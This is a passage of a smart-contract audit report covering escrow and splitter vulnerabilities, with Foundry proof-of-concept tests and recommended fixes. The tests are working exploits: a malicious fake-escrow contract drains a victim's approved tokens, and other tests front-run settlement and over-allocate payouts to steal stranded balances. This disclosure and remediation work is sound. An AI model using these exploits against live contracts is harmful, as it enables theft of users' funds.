  }
  
  /**
   * @title POC: Direct escrow collect permanently bricks splitter settlement
   * @notice Proof Statement: Prove that once a splitter-addressed fulfillment has a valid oracle decision,
   * any third party can call the underlying escrow's public `collect()`, move the escrowed tokens into the
   * splitter, revoke the escrow attestation, and permanently break both splitter settlement entrypoints while
   * the collected funds remain stranded inside the splitter.
   *
   * Bug Vector:
   * 1. Buyer escrows ERC20 tokens behind a splitter arbiter.
   * 2. Executor creates the splitter-owned fulfillment and the oracle records valid splits.
   * 3. An unrelated attacker calls the underlying escrow contract directly.
   * 4. The escrow revokes and transfers funds to the splitter, but later distribution calls revert because the
   *    splitter requires the escrow attestation to still be live before it can distribute.
   */
  contract POC_ERC20Splitter_c90819c7_Test is Test {
      ERC20Splitter internal splitter;
      ERC20EscrowObligation internal escrowObligation;
      StringObligation internal stringObligation;
      IEAS internal eas;
      ISchemaRegistry internal schemaRegistry;
      POCMockERC20 internal token;
  
      address internal buyer = makeAddr("buyer");
      address internal oracle = makeAddr("oracle");
      address internal executor = makeAddr("executor");
      address internal attacker = makeAddr("attacker");
      address internal alice = makeAddr("alice");
      address internal bob = makeAddr("bob");
  
      uint256 internal constant AMOUNT = 100 ether;
      uint64 internal constant EXPIRATION = 365 days;
  
      function setUp() public {
          EASDeployer easDeployer = new EASDeployer();
          (eas, schemaRegistry) = easDeployer.deployEAS();
  
          splitter = new ERC20Splitter(eas);
          escrowObligation = new ERC20EscrowObligation(eas, schemaRegistry);
          stringObligation = new StringObligation(eas, schemaRegistry);
          token = new POCMockERC20();
  
          token.transfer(buyer, 1_000 ether);
      }
  
      function testDirectCollectBricksSettlementAndStrandsFunds() public {
          bytes32 escrowUid = _createEscrow();
          bytes32 fulfillmentUid = _createFulfillmentViaSplitter(escrowUid);
  
          ERC20Splitter.Split[] memory splits = new ERC20Splitter.Split[](2);
          splits[0] = ERC20Splitter.Split({recipient: alice, amount: 60 ether});
          splits[1] = ERC20Splitter.Split({recipient: bob, amount: 40 ether});
  
          vm.prank(oracle);
          splitter.arbitrate(fulfillmentUid, escrowUid, splits);
  
          vm.prank(attacker);
          escrowObligation.collect(escrowUid, fulfillmentUid);
  
          Attestation memory escrowAttestation = eas.getAttestation(escrowUid);
          assertGt(escrowAttestation.revocationTime, 0, "escrow should be consumed by direct collect");
          assertEq(token.balanceOf(address(escrowObligation)), 0, "escrow should no longer hold tokens");
          assertEq(token.balanceOf(address(splitter)), AMOUNT, "splitter should now hold the collected tokens");
          assertEq(token.balanceOf(alice), 0, "intended recipients should not be paid yet");
          assertEq(token.balanceOf(bob), 0, "intended recipients should not be paid yet");
  
          vm.expectRevert(ArbiterUtils.AttestationRevoked.selector);
          splitter.collectAndDistribute(address(escrowObligation), escrowUid, fulfillmentUid);
  
          vm.expectRevert(ArbiterUtils.AttestationRevoked.selector);
          splitter.unsafePartiallyCollectAndDistribute(address(escrowObligation), escrowUid, fulfillmentUid);
  
          assertEq(token.balanceOf(address(splitter)), AMOUNT, "funds stay stranded in the splitter");
          assertEq(token.balanceOf(alice), 0, "atomic path can no longer pay recipients");
          assertEq(token.balanceOf(bob), 0, "partial path also cannot pay recipients");
      }
  
      function _createEscrow() internal returns (bytes32) {
          bytes memory demand = abi.encode(ERC20Splitter.DemandData({oracle: oracle, data: bytes("")}));
          ERC20EscrowObligation.ObligationData memory data = ERC20EscrowObligation.ObligationData({
              token: address(token),
              amount: AMOUNT,
              arbiter: address(splitter),
              demand: demand
          });
  
          vm.startPrank(buyer);
          token.approve(address(escrowObligation), AMOUNT);
          bytes32 uid = escrowObligation.doObligation(data, uint64(block.timestamp + EXPIRATION));
          vm.stopPrank();
  
          return uid;
      }
  
      function _createFulfillmentViaSplitter(bytes32 escrowUid) internal returns (bytes32) {
          bytes memory obligationData =
              abi.encode(StringObligation.ObligationData({item: "fulfillment", schema: bytes32(0)}));
  
          vm.prank(executor);
          return splitter.createFulfillment(address(stringObligation), obligationData, 0, escrowUid);
      }
  }

```

#### Recommendation

The escrow base layer should prevent direct settlement when the fulfillment recipient is a contract that must perform follow-up logic. The safest fix is to require `msg.sender == fulfillment.recipient` when `fulfillment.recipient` is a contract, or to add an escrow-side opt-in interface for recipient contracts that require self-collection.

A simpler alternative is to add a splitter-side rescue function that distributes balances from an already-collected escrow without requiring the escrow attestation to remain live, but that is weaker because it patches only the currently-known recipient contracts instead of fixing the lifecycle invariant at the root.

#### Assumptions

- [x] The escrow uses a splitter as its arbiter and the fulfillment recipient is the splitter contract.
- [x] A valid arbiter/oracle decision already exists for the fulfillment.
- [x] The splitter does not expose any alternate post-collection distribution path that skips `verifyEscrowAttestation`.
- [x] The issue is a settlement-finality break even though the attacker does not receive funds directly, because the protocol permanently loses the ability to distribute collected assets.
- [x] Permanent splitter lockup is in scope because it is caused by an unauthorized alternate settlement path in production contracts.

#### Predicted Invalid Reasons

- "Anyone can call `collect`; the funds still go to the splitter, so this is just a benign alternate execution path."

<a id="finding-alka-34"></a>
### ALKA-34 — Public unsafe partial splitter settlement lets outsiders finalize only attacker-favorable transfers

#### Summary

All splitter variants expose public `unsafePartiallyCollectAndDistribute` entrypoints with no caller authorization. An outsider can front-run normal atomic settlement, force `collect` to revoke the escrow, let successful recipient transfers complete, strand failed shares inside the splitter, and block later retries because the escrow has already been consumed.

#### Context Files

##### ERC20Splitter unsafe partial settlement

Path: `contracts/src/utils/splitters/ERC20Splitter.sol`
Highlight lines: 1

```solidity
function unsafePartiallyCollectAndDistribute(address escrowContract, bytes32 escrow, bytes32 fulfillment)
    external
    nonReentrant
{
    (Split[] memory splits, address token) = _collectAndDecode(escrowContract, escrow, fulfillment);
    address fulfiller = _recordedFulfiller(fulfillment);
    for (uint256 i; i < splits.length; ++i) {
        address recipient = _resolveSentinel(splits[i].recipient, fulfillment, fulfiller);
        bool success = IERC20(token).trySafeTransfer(recipient, splits[i].amount);
        if (!success) {
            emit ERC20TransferFailedOnDistribute(recipient, token, splits[i].amount);
        }
    }
    emit EscrowCollectedAndDistributed(escrow, fulfillment, fulfiller, token, splits);
}
```

##### TokenBundleSplitterBase unsafe partial settlement

Path: `contracts/src/utils/splitters/TokenBundleSplitterBase.sol`
Highlight lines: 1

```solidity
function unsafePartiallyCollectAndDistribute(address escrowContract, bytes32 escrow, bytes32 fulfillment)
    external
    nonReentrant
{
    (BundleSplit[] memory splits, EscrowObligationData memory escrowData) =
        _collectAndDecode(escrowContract, escrow, fulfillment);
    address fulfiller = _recordedFulfiller(fulfillment);
    for (uint256 s; s < splits.length; ++s) {
        address recipient = _resolveSentinel(splits[s].recipient, fulfillment, fulfiller);
        _distributePartial(splits[s], escrowData, recipient);
    }
    emit EscrowCollectedAndDistributed(escrow, fulfillment, fulfiller);
}
```

##### BaseEscrowObligation.collect

Path: `contracts/src/BaseEscrowObligation.sol`
Highlight lines: 1

```solidity
function collect(bytes32 _escrow, bytes32 _fulfillment)
    public
    virtual
    override
    nonReentrant
    returns (bytes memory)
{
    ...
    if (!IArbiter(arbiter).check(fulfillment, demand, escrow.uid)) {
        revert InvalidFulfillment();
    }
    eas.revoke(...);
    bytes memory result = _releaseEscrow(escrow, fulfillment.recipient, _fulfillment);
    emit EscrowCollected(_escrow, _fulfillment, fulfillment.recipient);
    return result;
}
```

#### Proof of Concept

Run the provided Foundry test `contracts/test/poc/POC_NativeTokenSplitter_85e53168.t.sol`. It creates a native-token escrow and a splitter-owned fulfillment, sets an oracle-approved split with `EXECUTOR_SENTINEL` plus a non-payable recipient, shows the safe `collectAndDistribute` path reverting on `NativeTokenTransferFailed`, then shows an unrelated outsider invoking `unsafePartiallyCollectAndDistribute` to revoke the escrow, pay the `EXECUTOR_SENTINEL` share, strand the incompatible share in the splitter, and make later atomic settlement revert with `AttestationRevoked()`.

##### POC_NativeTokenSplitter_85e53168.t.sol

Path: `contracts/test/poc/POC_NativeTokenSplitter_85e53168.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";

import {IEAS, Attestation} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";

import {ArbiterUtils} from "@src/libraries/ArbiterUtils.sol";
import {NativeTokenEscrowObligation} from "@src/obligations/escrow/default/NativeTokenEscrowObligation.sol";
import {StringObligation} from "@src/obligations/StringObligation.sol";
import {NativeTokenSplitter} from "@src/utils/splitters/NativeTokenSplitter.sol";

import {EASDeployer} from "@test/utils/EASDeployer.sol";

contract RejectingRecipient {
    receive() external payable {
        revert("NO_ETH");
    }
}

/**
 * @title POC: Public unsafe splitter settlement finalizes only attacker-favorable native transfers
 * @notice Proof Statement: Prove that once an oracle-approved native-token split includes one compatible
 * recipient and one incompatible recipient, any external caller can invoke
 * `unsafePartiallyCollectAndDistribute` to revoke the escrow, pay the compatible share, strand the
 * incompatible share inside the splitter, and permanently block later atomic settlement.
 */
contract POC_NativeTokenSplitter_85e53168 is Test {
    NativeTokenSplitter internal splitter;
    NativeTokenEscrowObligation internal escrowObligation;
    StringObligation internal stringObligation;
    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;

    address internal buyer = makeAddr("buyer");
    address internal oracle = makeAddr("oracle");
    address internal attacker = makeAddr("attacker");
    address internal outsider = makeAddr("outsider");

    uint256 internal constant TOTAL_AMOUNT = 1 ether;
    uint256 internal constant ATTACKER_SHARE = 0.6 ether;
    uint256 internal constant STRANDED_SHARE = 0.4 ether;

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();

        splitter = new NativeTokenSplitter(eas);
        escrowObligation = new NativeTokenEscrowObligation(eas, schemaRegistry);
        stringObligation = new StringObligation(eas, schemaRegistry);

        vm.deal(buyer, 10 ether);
    }

    function testPOC_UnsafePartialSettlementCanBeForcedByOutsider() public {
        RejectingRecipient badRecipient = new RejectingRecipient();
        bytes32 escrowUid = _createEscrow();
        bytes32 fulfillmentUid = _createFulfillmentViaSplitter(attacker, escrowUid);

        NativeTokenSplitter.Split[] memory splits = new NativeTokenSplitter.Split[](2);
        splits[0] = NativeTokenSplitter.Split({recipient: splitter.EXECUTOR_SENTINEL(), amount: ATTACKER_SHARE});
        splits[1] = NativeTokenSplitter.Split({recipient: address(badRecipient), amount: STRANDED_SHARE});

        vm.prank(oracle);
        splitter.arbitrate(fulfillmentUid, escrowUid, splits);

        vm.prank(outsider);
        vm.expectRevert(
            abi.encodeWithSelector(
                NativeTokenSplitter.NativeTokenTransferFailed.selector, address(badRecipient), STRANDED_SHARE
            )
        );
        splitter.collectAndDistribute(address(escrowObligation), escrowUid, fulfillmentUid);

        Attestation memory escrowAfterAtomicRevert = eas.getAttestation(escrowUid);
        assertEq(escrowAfterAtomicRevert.revocationTime, 0, "atomic revert must leave escrow collectible");
        assertEq(attacker.balance, 0, "attacker is not paid during the reverted atomic attempt");

        vm.prank(outsider);
        splitter.unsafePartiallyCollectAndDistribute(address(escrowObligation), escrowUid, fulfillmentUid);

        Attestation memory escrowAfterUnsafe = eas.getAttestation(escrowUid);
        assertTrue(escrowAfterUnsafe.revocationTime != 0, "unsafe path revokes the escrow");
        assertEq(attacker.balance, ATTACKER_SHARE, "attacker-favorable share is paid");
        assertEq(address(badRecipient).balance, 0, "incompatible recipient is skipped");
        assertEq(address(splitter).balance, STRANDED_SHARE, "failed share remains stranded in the splitter");

        vm.prank(outsider);
        vm.expectRevert(ArbiterUtils.AttestationRevoked.selector);
        splitter.collectAndDistribute(address(escrowObligation), escrowUid, fulfillmentUid);
    }

    function _createEscrow() internal returns (bytes32) {
        bytes memory demand = abi.encode(NativeTokenSplitter.DemandData({oracle: oracle, data: bytes("")}));
        NativeTokenEscrowObligation.ObligationData memory data =
            NativeTokenEscrowObligation.ObligationData({amount: TOTAL_AMOUNT, arbiter: address(splitter), demand: demand});

        vm.prank(buyer);
        return escrowObligation.doObligation{value: TOTAL_AMOUNT}(data, uint64(block.timestamp + 1 days));
    }

    function _createFulfillmentViaSplitter(address fulfiller, bytes32 escrowUid) internal returns (bytes32) {
        bytes memory obligationData =
            abi.encode(StringObligation.ObligationData({item: "fulfillment", schema: bytes32(0)}));

        vm.prank(fulfiller);
        return splitter.createFulfillment(address(stringObligation), obligationData, 0, escrowUid);
    }
}
```

#### Recommendation

Require explicit opt-in from the fulfillment recipient or recorded fulfiller before a splitter can revoke and execute a partial redistribution.

Primary fix:

```solidity
function unsafePartiallyCollectAndDistribute(address escrowContract, bytes32 escrow, bytes32 fulfillment)
    external
    nonReentrant
{
    address fulfiller = _recordedFulfiller(fulfillment);
    Attestation memory fulfillmentAttestation = eas.getAttestation(fulfillment);
    if (msg.sender != fulfillmentAttestation.recipient && msg.sender != fulfiller) {
        revert UnauthorizedCall();
    }
    ...
}
```

Additional hardening:
- Emit a distinct “partial settlement” event instead of the normal success event.
- Consider removing the public fallback entirely from splitter contracts and keeping partial settlement as an escrow-recipient-only escape hatch.

#### Assumptions

- [x] An oracle-approved split already exists for the `(fulfillment, escrow)` pair.
- [x] At least one approved recipient cannot receive the asset under ordinary execution semantics.
- [x] The attacker benefits from one of the successful transfers, such as an `EXECUTOR_SENTINEL` payout.
- [x] The escrow is collectible when the unsafe call is made.

#### Predicted Invalid Reasons

- This function is intentionally unsafe and anyone can already call settlement, so there is no authorization issue.
- If a split contains an undeliverable recipient, that is just the user’s chosen policy failing.

<a id="finding-alka-33"></a>
### ALKA-33 — AtomicPaymentUtils accepts arbitrary attesters and can pay attacker-defined demands without any real escrow

#### Summary

`AtomicPaymentUtils` treats whatever contract is listed as `escrow.attester` as the escrow authority, decodes payment terms from it, and transfers caller assets before validating escrow provenance. A malicious self-attesting contract can use a fake UID to make `payErc20AndCollect` or `payBundleAndCollect` send real funds to an attacker while `collect` succeeds without releasing escrowed value.

#### Context Files

##### AtomicPaymentUtils.payErc20AndCollect

Path: `contracts/src/utils/atomic/AtomicPaymentUtils.sol`
Highlight lines: 91, 92, 93, 94, 95

```solidity
function payErc20AndCollect(bytes32 escrowUid) external returns (bytes32) {
    (Attestation memory escrow, bytes memory demand) = _getEscrowAndDemand(escrowUid);
    bytes32 fulfillmentUid = _payErc20(abi.decode(demand, (ERC20PaymentObligation.ObligationData)), escrowUid);
    _collect(escrow.attester, escrowUid, fulfillmentUid);
    return fulfillmentUid;
}
```

##### AtomicPaymentUtils._getEscrowAndDemand

Path: `contracts/src/utils/atomic/AtomicPaymentUtils.sol`
Highlight lines: 208, 209, 210, 211, 212, 213, 214, 215, 216

```solidity
function _getEscrowAndDemand(bytes32 escrowUid)
    internal
    view
    returns (Attestation memory escrow, bytes memory demand)
{
    escrow = eas.getAttestation(escrowUid);
    if (escrow.uid == bytes32(0) || escrow.uid != escrowUid) revert AttestationNotFound(escrowUid);
    (, demand) = IEscrow(escrow.attester).decodeCondition(escrow.data);
}
```

##### AtomicPaymentUtils._collect

Path: `contracts/src/utils/atomic/AtomicPaymentUtils.sol`
Highlight lines: 219, 220, 221, 222, 223, 224

```solidity
function _collect(address escrowContract, bytes32 escrowUid, bytes32 fulfillmentUid) internal {
    try IEscrow(escrowContract).collect(escrowUid, fulfillmentUid) {}
    catch {
        revert CouldntCollectEscrow();
    }
}
```

#### Proof of Concept

Save the PoC as `contracts/test/poc/POC_AtomicPaymentUtilsFakeEscrow_c9ef631b.t.sol`, then run `timeout 300 forge test --match-path test/poc/POC_AtomicPaymentUtilsFakeEscrow_c9ef631b.t.sol -vvv` from `contracts`. The test deploys a malicious self-attesting escrow, returns attacker-chosen `ERC20PaymentObligation.ObligationData` from `decodeCondition`, and shows `payErc20AndCollect` transferring real ERC20 from the victim to the attacker while the fake escrow never holds any asset.

##### POC_AtomicPaymentUtilsFakeEscrow_c9ef631b.t.sol

Path: `contracts/test/poc/POC_AtomicPaymentUtilsFakeEscrow_c9ef631b.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";

import {Attestation} from "@eas/Common.sol";
import {IEAS} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {BaseAttester} from "@src/BaseAttester.sol";
import {AtomicPaymentUtils} from "@src/utils/atomic/AtomicPaymentUtils.sol";
import {ERC20EscrowObligation} from "@src/obligations/escrow/default/ERC20EscrowObligation.sol";
import {ERC20PaymentObligation} from "@src/obligations/payment/ERC20PaymentObligation.sol";
import {ERC721PaymentObligation} from "@src/obligations/payment/ERC721PaymentObligation.sol";
import {ERC1155PaymentObligation} from "@src/obligations/payment/ERC1155PaymentObligation.sol";
import {NativeTokenPaymentObligation} from "@src/obligations/payment/NativeTokenPaymentObligation.sol";
import {TokenBundlePaymentObligation} from "@src/obligations/payment/TokenBundlePaymentObligation.sol";
import {EASDeployer} from "@test/utils/EASDeployer.sol";

contract MintableERC20 is ERC20 {
    constructor() ERC20("MockToken", "MOCK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousEscrow is BaseAttester {
    address internal immutable demandedToken;
    address internal immutable attacker;
    uint256 internal immutable demandedAmount;

    bool internal _collectCalled;
    bytes32 internal _lastEscrowUid;
    bytes32 internal _lastFulfillmentUid;

    constructor(IEAS eas, ISchemaRegistry schemaRegistry, address token, uint256 amount, address attacker_)
        BaseAttester(eas, schemaRegistry, "bytes fakeDemand", true)
    {
        demandedToken = token;
        demandedAmount = amount;
        attacker = attacker_;
    }

    function createFakeEscrow() external returns (bytes32) {
        return _attest(hex"deadbeef", attacker, 0, bytes32(0));
    }

    function collect(bytes32 escrowUid, bytes32 fulfillmentUid) external returns (bytes memory) {
        _collectCalled = true;
        _lastEscrowUid = escrowUid;
        _lastFulfillmentUid = fulfillmentUid;
        return "";
    }

    function reclaim(bytes32) external pure returns (bool) {
        return true;
    }

    function decodeCondition(bytes calldata) external view returns (address arbiter, bytes memory demand) {
        return (
            address(0),
            abi.encode(
                ERC20PaymentObligation.ObligationData({
                    token: demandedToken,
                    amount: demandedAmount,
                    payee: attacker
                })
            )
        );
    }

    function collectCalled() external view returns (bool) {
        return _collectCalled;
    }

    function lastEscrowUid() external view returns (bytes32) {
        return _lastEscrowUid;
    }

    function lastFulfillmentUid() external view returns (bytes32) {
        return _lastFulfillmentUid;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

/**
 * @title POC: AtomicPaymentUtils Pays a Fake Escrow Attester
 * @notice Proof Statement: Prove that `payErc20AndCollect` accepts an arbitrary EAS attestation whose attester only implements `decodeCondition` and `collect`, decodes attacker-chosen payment terms from that attester, transfers real ERC20 funds from the victim to the attacker, and completes successfully even though the attestation schema is not the real ERC20 escrow schema and no asset was ever escrowed.
 */
contract POC_AtomicPaymentUtilsFakeEscrow_c9ef631b is Test {
    uint256 internal constant AMOUNT = 1_000e6;

    address internal victim = address(0xBEEF);
    address internal attacker = address(0xA11CE);

    IEAS internal eas;
    AtomicPaymentUtils internal utils;
    ERC20EscrowObligation internal realEscrow;
    MintableERC20 internal token;
    MaliciousEscrow internal fakeEscrow;

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        ISchemaRegistry schemaRegistry;
        (eas, schemaRegistry) = easDeployer.deployEAS();

        ERC20PaymentObligation erc20Payment = new ERC20PaymentObligation(eas, schemaRegistry);
        ERC721PaymentObligation erc721Payment = new ERC721PaymentObligation(eas, schemaRegistry);
        ERC1155PaymentObligation erc1155Payment = new ERC1155PaymentObligation(eas, schemaRegistry);
        NativeTokenPaymentObligation nativePayment = new NativeTokenPaymentObligation(eas, schemaRegistry);
        TokenBundlePaymentObligation bundlePayment = new TokenBundlePaymentObligation(eas, schemaRegistry);

        utils = new AtomicPaymentUtils(
            eas,
            erc20Payment,
            erc721Payment,
            erc1155Payment,
            nativePayment,
            bundlePayment
        );
        realEscrow = new ERC20EscrowObligation(eas, schemaRegistry);
        token = new MintableERC20();
        fakeEscrow = new MaliciousEscrow(eas, schemaRegistry, address(token), AMOUNT, attacker);

        token.mint(victim, AMOUNT);

        vm.prank(victim);
        token.approve(address(utils), type(uint256).max);
    }

    function test_POC_fakeEscrowDrainsVictim() public {
        bytes32 fakeEscrowUid = fakeEscrow.createFakeEscrow();

        Attestation memory fakeEscrowAttestation = eas.getAttestation(fakeEscrowUid);
        assertEq(fakeEscrowAttestation.attester, address(fakeEscrow), "unexpected attester");
        assertTrue(
            fakeEscrowAttestation.schema != realEscrow.ATTESTATION_SCHEMA(),
            "expected non-escrow schema"
        );
        assertEq(token.balanceOf(address(fakeEscrow)), 0, "fake escrow already holds funds");

        vm.prank(victim);
        bytes32 fulfillmentUid = utils.payErc20AndCollect(fakeEscrowUid);

        Attestation memory fulfillment = eas.getAttestation(fulfillmentUid);
        ERC20PaymentObligation.ObligationData memory payment =
            abi.decode(fulfillment.data, (ERC20PaymentObligation.ObligationData));

        assertEq(payment.payee, attacker, "attacker was not paid");
        assertEq(fulfillment.recipient, victim, "victim should receive the proof");
        assertEq(fulfillment.refUID, fakeEscrowUid, "payment should reference fake escrow");
        assertEq(token.balanceOf(victim), 0, "victim did not lose funds");
        assertEq(token.balanceOf(attacker), AMOUNT, "attacker did not receive funds");
        assertEq(token.balanceOf(address(fakeEscrow)), 0, "no asset should have been escrowed");
        assertTrue(fakeEscrow.collectCalled(), "fake collect was not invoked");
        assertEq(fakeEscrow.lastEscrowUid(), fakeEscrowUid, "wrong escrow uid");
        assertEq(fakeEscrow.lastFulfillmentUid(), fulfillmentUid, "wrong fulfillment uid");
    }
}
```

##### forge test --match-path test/poc/POC_AtomicPaymentUtilsFakeEscrow_c9ef631b.t.sol -vvv

Path: `contracts`

```bash
timeout 300 forge test --match-path test/poc/POC_AtomicPaymentUtilsFakeEscrow_c9ef631b.t.sol -vvv
```

#### Recommendation

The helper must validate the attestation before spending caller funds.

Primary fix:

```solidity
function _getEscrowAndDemand(bytes32 escrowUid)
    internal
    view
    returns (Attestation memory escrow, bytes memory demand)
{
    escrow = eas.getAttestation(escrowUid);
    if (escrow.uid == bytes32(0) || escrow.uid != escrowUid) revert AttestationNotFound(escrowUid);

    if (!_isSupportedEscrowContract(escrow.attester)) revert InvalidEscrow();
    SplitterVerification.verifyEscrowAttestation(escrow, escrow.attester);
    (, demand) = IEscrow(escrow.attester).decodeCondition(escrow.data);
}
```

Additional hardening:
- Maintain an explicit allowlist of supported escrow obligation contracts in the helper constructor.
- Re-derive and validate the expected schema from the escrow contract before accepting its attestation.
- Reject escrow contracts that do not implement ERC165 `IEscrow`.

Fix checklist:

- [ ] Add an explicit supported-escrow contract check before calling `decodeCondition`.
- [ ] Verify the fetched attestation's schema and intrinsic validity before any payment helper spends caller funds.

#### Assumptions

- [x] Victims use `pay*AndCollect` or SDK wrappers instead of manually validating the attestation first.
- [x] The attacker can surface an attacker-controlled escrow UID to the victim or integration.
- [x] The attacker can deploy a contract that self-attests through EAS and appears as the attester.
- [x] The victim is willing to settle by UID through the helper flow.

#### Predicted Invalid Reasons

- This helper assumes callers only pass real escrow UIDs.
- If a user settles a malicious attestation, that is user error or an integration issue.
- The counterparty can inspect the attestation first.

<a id="finding-alka-32"></a>
### ALKA-32 — TokenBundleSplitterUnvalidated can steal previously stranded native, ERC20, and ERC1155 balances through later over-allocation

#### Summary

`TokenBundleSplitterUnvalidated` checks that the current escrow increased the splitter’s balances, but it does not cap payouts to those deltas. Because `_distributeAtomic` spends from the splitter’s aggregate native/ERC20/ERC1155 holdings, a later attacker-controlled escrow can over-allocate and drain previously stranded balances.

#### Context Files

##### TokenBundleSplitterUnvalidated.arbitrate

Path: `alkahest/contracts/src/utils/splitters/TokenBundleSplitterUnvalidated.sol`
Highlight lines: 4

```solidity
/// Token bundle splitter without validation of split totals.
/// Cheaper oracle calls, but incorrect splits will only surface
/// as reverts during collectAndDistribute (over-allocation) or
/// stranded tokens in the splitter (under-allocation).
contract TokenBundleSplitterUnvalidated is TokenBundleSplitterBase {
    function arbitrate(bytes32 fulfillment, bytes32 escrow, BundleSplit[] calldata splits) external override {
        ...
        _storeDecision(msg.sender, decisionKey, splits);
    }
}
```

##### TokenBundleSplitterBase._storeDecision

Path: `alkahest/contracts/src/utils/splitters/TokenBundleSplitterBase.sol`
Highlight lines: 91

```solidity
function _storeDecision(address oracle, bytes32 decisionKey, BundleSplit[] calldata splits) internal {
    ...
    for (uint256 i; i < splits.length; ++i) {
        decisions[oracle][decisionKey].push();
        BundleSplit storage stored = decisions[oracle][decisionKey][i];
        stored.nativeAmount = splits[i].nativeAmount;
        ...
        stored.erc20Amounts.push(splits[i].erc20Amounts[j]);
        stored.erc1155Amounts.push(splits[i].erc1155Amounts[j]);
    }
    hasDecision[oracle][decisionKey] = true;
}
```

##### TokenBundleSplitterBase.collect path

Path: `alkahest/contracts/src/utils/splitters/TokenBundleSplitterBase.sol`
Highlight lines: 154

```solidity
splits = decisions[demandData.oracle][_decisionKey(fulfillment, escrow)];
uint256 nativeBefore = address(this).balance;
uint256[] memory erc20Before = _erc20Balances(escrowData);
uint256[] memory erc1155Before = _erc1155Balances(escrowData);
IEscrow(escrowContract).collect(escrow, fulfillment);
_verifyCollectedDeltas(escrowData, nativeBefore, erc20Before, erc1155Before);
```

##### TokenBundleSplitterBase._distributeAtomic

Path: `alkahest/contracts/src/utils/splitters/TokenBundleSplitterBase.sol`
Highlight lines: 291

```solidity
if (split.nativeAmount > 0) {
    payable(recipient).call{value: split.nativeAmount}("");
}
for (uint256 i; i < split.erc20Amounts.length; ++i) {
    IERC20(escrowData.erc20Tokens[i]).trySafeTransfer(recipient, split.erc20Amounts[i]);
}
for (uint256 i; i < split.erc1155Amounts.length; ++i) {
    IERC1155(escrowData.erc1155Tokens[i]).safeTransferFrom(
        address(this), recipient, escrowData.erc1155TokenIds[i], split.erc1155Amounts[i], ""
    );
}
```

#### Proof of Concept

1. Seed the splitter with a prior escrow by calling `escrow.collect(...)` after arbitration.
2. Create a later zero-value escrow naming the same native/ERC20/ERC1155 assets, self-oracle an over-allocated split, and call `collectAndDistribute`.
3. The replayed logs show `1 ether`, `100e18` ERC20, and `50` ERC1155 units drained from the earlier escrow.

##### Reproduction command

Path: `alkahest/contracts`

```bash
cd alkahest/contracts
forge test --match-path test/unit/utils/splitters/POC_TokenBundleSplitterUnvalidated_f58275d0.t.sol -vv
```

##### POC_TokenBundleSplitterUnvalidated_f58275d0

Path: `alkahest/contracts/test/unit/utils/splitters/POC_TokenBundleSplitterUnvalidated_f58275d0.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import {IEAS} from "@eas/IEAS.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";

import {StringObligation} from "@src/obligations/StringObligation.sol";
import {TokenBundleEscrowObligation} from "@src/obligations/escrow/default/TokenBundleEscrowObligation.sol";
import {TokenBundleSplitterBase} from "@src/utils/splitters/TokenBundleSplitterBase.sol";
import {TokenBundleSplitterUnvalidated} from "@src/utils/splitters/TokenBundleSplitterUnvalidated.sol";
import {EASDeployer} from "@test/utils/EASDeployer.sol";

contract MockERC20POC is ERC20 {
    constructor() ERC20("Mock Token", "MCK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockERC1155POC is ERC1155 {
    constructor() ERC1155("https://example.com/{id}.json") {}

    function mint(address to, uint256 id, uint256 amount) external {
        _mint(to, id, amount, "");
    }
}

/**
 * @title POC: TokenBundleSplitterUnvalidated Drains Earlier Stranded Balances
 * @notice Proof Statement: Prove that once native, ERC20, and ERC1155 assets are stranded inside
 * `TokenBundleSplitterUnvalidated`, a later attacker can create a new escrow that names the same
 * asset types, over-allocate their own split, and withdraw the older stranded balances. This test
 * seeds the stranded state using only public/external interfaces by calling the escrow contract's
 * public `collect` entrypoint directly, which transfers the victim bundle into the splitter without
 * distribution. The attacker then creates a zero-value escrow, self-oracles an over-allocated split,
 * and drains the victim's stranded balances.
 */
contract POC_TokenBundleSplitterUnvalidated_f58275d0 is Test {
    uint256 internal constant VICTIM_NATIVE = 1 ether;
    uint256 internal constant VICTIM_ERC20 = 100e18;
    uint256 internal constant VICTIM_ERC1155 = 50;
    uint256 internal constant ERC1155_ID = 7;
    uint64 internal constant EXPIRATION = 365 days;

    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;
    TokenBundleSplitterUnvalidated internal splitter;
    TokenBundleEscrowObligation internal escrowObligation;
    StringObligation internal stringObligation;
    MockERC20POC internal token;
    MockERC1155POC internal multiToken;

    address internal victim = makeAddr("victim");
    address internal victimOracle = makeAddr("victimOracle");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();

        splitter = new TokenBundleSplitterUnvalidated(eas);
        escrowObligation = new TokenBundleEscrowObligation(eas, schemaRegistry);
        stringObligation = new StringObligation(eas, schemaRegistry);
        token = new MockERC20POC();
        multiToken = new MockERC1155POC();

        token.mint(victim, VICTIM_ERC20);
        multiToken.mint(victim, ERC1155_ID, VICTIM_ERC1155);
        vm.deal(victim, VICTIM_NATIVE);

        vm.startPrank(victim);
        token.approve(address(escrowObligation), type(uint256).max);
        multiToken.setApprovalForAll(address(escrowObligation), true);
        vm.stopPrank();

        vm.startPrank(attacker);
        token.approve(address(escrowObligation), type(uint256).max);
        multiToken.setApprovalForAll(address(escrowObligation), true);
        vm.stopPrank();
    }

    function testPOC_crossEscrowDrainViaLaterOverallocation() public {
